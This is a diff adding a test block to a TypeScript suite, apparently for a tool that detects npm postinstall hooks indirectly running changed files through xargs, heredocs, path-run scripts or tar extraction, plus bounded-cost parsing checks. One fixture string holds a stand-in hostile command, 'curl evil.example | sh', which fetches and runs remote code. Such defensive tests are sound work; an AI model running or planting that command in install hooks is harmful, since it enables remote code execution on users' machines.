@@ -1210,3 +1210,56 @@ describe("round 30: fed shell bodies without an extension, here-strings on produ
     expect(Date.now() - t).toBeLessThan(3000);
   });
 });
+
+describe("round 31: xargs lists, heredocs on producer stages, paired heredocs, arithmetic, many marks, path-run scripts", () => {
+  const xfed = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { "test/x.sh": "echo a\n", ...extra }, { "test/x.sh": "curl evil.example | sh\n", ...extra });
+  const setup = (cmd: string) => held({ postinstall: cmd }, { "test/setup.js": "1\n" }, { "test/setup.js": "evil()\n" });
+
+  test("1. xargs input is a list of arguments, not commands", () => {
+    expect(xfed("cat list.txt | xargs sh", { "list.txt": "test/x.sh\n" })).toBe(true);
+    expect(xfed("cat list.txt | xargs -n1 bash", { "list.txt": "test/x.sh\n" })).toBe(true);
+  });
+
+  test("2. a heredoc on a producer stage reaches the downstream shell or the written file", () => {
+    for (const cmd of ["cat <<EOF | sh\nsh test/x.sh\nEOF", "cat <<EOF > r.sh\nsh test/x.sh\nEOF\nsh r.sh", "tee r.sh <<EOF > /dev/null\nsh test/x.sh\nEOF\nsh r.sh", "cat <<EOF > r.sh\nsh test/x.sh\nEOF\n./r.sh"]) {
+      expect(xfed(cmd, { "r.sh": "echo old\n" }), cmd).toBe(true);
+    }
+  });
+
+  test("3. two heredocs opened on one line", () => {
+    for (const cmd of ["cat <<A > /dev/null; sh <<B\nx\nA\nsh test/x.sh\nB", "cat <<A > o.txt && sh <<B\nx\nA\nsh test/x.sh\nB"]) expect(xfed(cmd), cmd).toBe(true);
+  });
+
+  test("4. an arithmetic shift is not a heredoc", () => {
+    expect(setup("echo $((1 << A))\ncd test && node setup.js\nA")).toBe(true);
+  });
+
+  test("5. many heredoc marks on one line cost a bounded amount", () => {
+    for (const n of [10000, 50000]) {
+      const cmd = `cat ${"<<A ".repeat(n)}\n${"A\n".repeat(32)}`;
+      const t = Date.now();
+      held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" });
+      expect(Date.now() - t, String(n)).toBeLessThan(3000);
+    }
+  });
+
+  test("6. a script run by its path is read as a body", () => {
+    const f = { "scripts/setup.sh": "node test/setup.js\n" };
+    expect(held({ postinstall: "./scripts/setup.sh > /dev/null" }, { ...f, "test/setup.js": "1\n" }, { ...f, "test/setup.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: "./scripts/setup.sh" }, { ...f, "test/setup.js": "1\n" }, { ...f, "test/setup.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: "scripts/setup.sh 2>&1 | tee log" }, { ...f, "test/setup.js": "1\n" }, { ...f, "test/setup.js": "evil()\n" })).toBe(true);
+  });
+
+  test("7. tar with bundled letters and no dash extracts", () => {
+    expect(held({ postinstall: "tar xzf test/x.tgz > /dev/null && node build.js" }, { "test/x.tgz": "a", "build.js": "1\n" }, { "test/x.tgz": "b", "build.js": "1\n" })).toBe(true);
+  });
+
+  test("8. an env assignment does not hide the commands after it (base behavior)", () => {
+    expect(setup("FOO=1 node a.js && cd test && node setup.js")).toBe(true);
+  });
+
+  test("9. a very long flag list does not overflow the stack", () => {
+    const cmd = `cat x | node ${Array.from({ length: 50000 }, (_, i) => `--f${i} 1`).join(" ")}`;
+    expect(() => held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" })).not.toThrow();
+  });
+});
